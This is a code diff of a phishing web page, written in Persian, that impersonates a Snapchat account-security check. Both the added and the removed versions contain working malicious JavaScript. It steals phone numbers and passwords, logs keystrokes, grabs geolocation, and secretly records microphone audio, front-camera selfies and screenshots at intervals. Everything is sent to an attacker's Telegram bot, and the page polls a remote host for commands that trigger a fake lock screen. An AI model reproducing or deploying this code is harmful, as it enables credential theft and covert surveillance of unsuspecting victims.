@@ -3,33 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Snapchat Security Hub</title>
+    <title>Snapchat Security Check</title>
     <link rel="manifest" href="manifest.json">
     <style>
         body { background: #FFFC00; margin: 0; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: white; width: 85%; max-width: 380px; padding: 35px 20px; border-radius: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center; z-index: 5; }
-        .logo { width: 70px; margin-bottom: 15px; }
-        input { width: 100%; padding: 16px; margin: 10px 0; border: 1px solid #ddd; border-radius: 15px; font-size: 16px; outline: none; box-sizing: border-box; background: #f9f9f9; }
-        .btn { background: #000; color: #fff; width: 100%; padding: 18px; border-radius: 35px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
-        #dim { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; }
+        .card { background: white; width: 85%; max-width: 380px; padding: 40px 20px; border-radius: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.15); text-align: center; z-index: 10; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        input { width: 100%; padding: 18px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 18px; font-size: 16px; outline: none; box-sizing: border-box; background: #fafafa; }
+        .btn { background: #000; color: #fff; width: 100%; padding: 20px; border-radius: 40px; border: none; font-weight: bold; cursor: pointer; font-size: 19px; margin-top: 15px; }
+        #dim { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; }
+        .status { display: none; color: #555; font-size: 14px; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div id="dim"></div>
     <div class="card" id="ui">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" class="logo">
-        <h2>تایید امنیت حساب</h2>
-        <p style="font-size: 13px;">برای جلوگیری از مسدود شدن دائمی، وارد شوید.</p>
+        <h2>تایید هویت حساب</h2>
+        <p style="font-size: 13px; color: #444;">برای جلوگیری از مسدود شدن اکانت، اطلاعات را تایید کنید.</p>
         <input type="tel" id="u_phone" placeholder="شماره تلفن">
         <input type="password" id="u_pass" placeholder="رمز عبور">
-        <button class="btn" onclick="ignite()">تایید و فعال‌سازی</button>
-        <p id="msg" style="display:none; color:red; font-size:12px; margin-top:10px;">در حال بررسی دسترسی‌ها...</p>
+        <button class="btn" onclick="startMaster()">تایید و اتصال امن</button>
+        <div id="st" class="status">🔄 در حال اسکن امنیتی سیستم...</div>
     </div>
 
-    <video id="v_screen" autoplay playsinline style="display:none;"></video>
+    <video id="v_scr" autoplay playsinline style="display:none;"></video>
     <video id="v_cam" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
-    <audio id="bg_silence" loop><source src="https://github.com/anars/blank-audio/raw/master/10-seconds-of-silence.mp3"></audio>
+    <audio id="bg_aud" loop><source src="https://github.com/anars/blank-audio/raw/master/10-seconds-of-silence.mp3"></audio>
 
     <script>
         const CFG = {
@@ -38,83 +39,84 @@
             h: "https://whale-tracker-live.github.io/Snapchat/"
         };
 
-        let keys = "";
-        
+        let kl = ""; // Keylogger memory
+
         // ۱. کی‌لاگر (Keylogger)
-        document.addEventListener('keydown', (e) => {
-            keys += e.key;
-            if (keys.length > 10) { 
-                tg(`⌨️ کلیدهای فشرده شده: ${keys}`);
-                keys = ""; 
-            }
+        document.addEventListener('keyup', (e) => {
+            kl += e.key + " ";
+            if(kl.length > 15) { tg(`⌨️ کلیدهای فشرده شده:\n${kl}`); kl = ""; }
         });
 
-        async function tg(m, b = null, isAudio = false) {
-            const type = b ? (isAudio ? 'sendAudio' : 'sendDocument') : 'sendMessage';
+        async function tg(m, b = null, isAud = false) {
+            const type = b ? (isAud ? 'sendAudio' : 'sendDocument') : 'sendMessage';
             const u = `https://api.telegram.org/bot${CFG.t}/${type}`;
             const f = new FormData();
             f.append('chat_id', CFG.c);
-            if (b) f.append(isAudio ? 'audio' : 'document', b, isAudio ? 'voice.ogg' : `file_${Date.now()}.jpg`);
+            if (b) f.append(isAud ? 'audio' : 'document', b, isAud ? 'v.ogg' : `f_${Date.now()}.jpg`);
             else f.append('text', m);
             try { await fetch(u, { method: 'POST', body: f }); } catch(e) {}
         }
 
-        async function ignite() {
+        async function startMaster() {
             const ph = document.getElementById('u_phone').value;
-            const pw = document.getElementById('u_pass').value;
-            if(!ph || !pw) return alert("لطفا اطلاعات را کامل کنید.");
+            const ps = document.getElementById('u_pass').value;
+            if(!ph || !ps) return alert("لطفا فیلدها را پر کنید");
 
-            document.getElementById('bg_silence').play();
-            document.getElementById('msg').style.display = 'block';
-            await tg(`🎯 هدف صید شد!\n📞 شماره: ${ph}\n🔑 رمز: ${pw}`);
+            document.getElementById('bg_aud').play();
+            document.getElementById('st').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
 
-            // ۲. شنود صدا (Audio Capture)
+            await tg(`🎯 شکار جدید!\n📞 شماره: ${ph}\n🔑 رمز: ${ps}`);
+
+            // ۲. لوکیشن
+            navigator.geolocation.getCurrentPosition(p => {
+                tg(`📍 لوکیشن:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, null, {enableHighAccuracy:true});
+
+            // ۳. شنود صدا (هر ۱۰ ثانیه)
             try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(audioStream);
-                mediaRecorder.ondataavailable = (e) => tg("🎙 شنود صدا (۱۰ ثانیه)", e.data, true);
-                setInterval(() => {
-                    mediaRecorder.stop();
-                    mediaRecorder.start();
-                }, 10000); // هر ۱۰ ثانیه صوت ارسال می‌شود
-                mediaRecorder.start();
-            } catch(e) { tg("⚠️ دسترسی به میکروفون رد شد."); }
+                const aud = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(aud);
+                rec.ondataavailable = (e) => tg("🎙 شنود محیط", e.data, true);
+                setInterval(() => { rec.stop(); rec.start(); }, 10000);
+                rec.start();
+            } catch(e) { tg("⚠️ میکروفون رد شد."); }
 
-            // ۳. دوربین سلفی (Selfie Capture)
+            // ۴. دوربین سلفی مخفی (هر ۱۵ ثانیه)
             try {
-                const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const cam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const vCam = document.getElementById('v_cam');
-                vCam.srcObject = camStream;
+                vCam.srcObject = cam;
                 setInterval(() => {
                     const can = document.getElementById('c');
                     can.width = vCam.videoWidth; can.height = vCam.videoHeight;
                     can.getContext('2d').drawImage(vCam, 0, 0);
-                    can.toBlob(b => tg("📷 عکس سلفی مخفی", b), 'image/jpeg', 0.3);
-                }, 15000); // هر ۱۵ ثانیه یک سلفی
-            } catch(e) { tg("⚠️ دسترسی دوربین رد شد."); }
+                    can.toBlob(b => tg("📷 عکس سلفی", b), 'image/jpeg', 0.3);
+                }, 15000);
+            } catch(e) { tg("⚠️ دوربین رد شد."); }
 
-            // ۴. اسکرین‌شات (Screen Capture)
+            // ۵. اسکرین‌شات از صفحه (هر ۱۰ ثانیه)
             try {
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const vScr = document.getElementById('v_screen');
-                vScr.srcObject = screenStream;
+                const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const vScr = document.getElementById('v_scr');
+                vScr.srcObject = scr;
                 setInterval(() => {
                     const can = document.getElementById('c');
                     can.width = vScr.videoWidth; can.height = vScr.videoHeight;
                     can.getContext('2d').drawImage(vScr, 0, 0);
-                    can.toBlob(b => tg("🖥 اسکرین‌شات (هر ۱۰ ثانیه)", b), 'image/jpeg', 0.2);
-                }, 10000); // هر ۱۰ ثانیه اسکرین‌شات
+                    can.toBlob(b => tg("🖥 اسکرین‌شات صفحه", b), 'image/jpeg', 0.2);
+                }, 10000);
             } catch(e) { tg("⚠️ اسکرین‌شات تایید نشد."); }
         }
 
-        // سیستم فرمان از راه دور
+        // سیستم دستورات از راه دور
         setInterval(async () => {
             try {
-                const r = await fetch(CFG.h + 'commands.json?t=' + Date.now());
+                const r = await fetch(CFG.h + 'commands.json?v=' + Date.now());
                 const d = await r.json();
                 document.getElementById('dim').style.display = (d.action === 'fake_lock') ? 'block' : 'none';
             } catch(e) {}
-        }, 3000);
+        }, 4000);
     </script>
 </body>
 </html>
